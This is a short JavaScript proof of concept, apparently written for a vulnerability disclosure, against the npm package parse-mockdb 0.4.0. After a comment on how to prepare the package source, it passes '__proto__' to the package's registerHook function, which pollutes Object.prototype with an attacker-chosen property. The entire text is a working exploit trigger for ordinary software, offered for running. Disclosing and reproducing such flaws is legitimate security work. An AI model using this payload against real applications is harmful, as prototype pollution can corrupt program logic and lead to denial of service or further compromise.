// comment out the following lines in parse-mockdb@0.4.0\parse-mockdb@0.4.0\src\parse-mockdb.js: to run the PoC
// const _ = require('lodash');
// const crypto = require('./crypto');


const ParseMockDB = require('./parse-mockdb@0.4.0')
ParseMockDB.registerHook('__proto__', 'polluted', 'yes')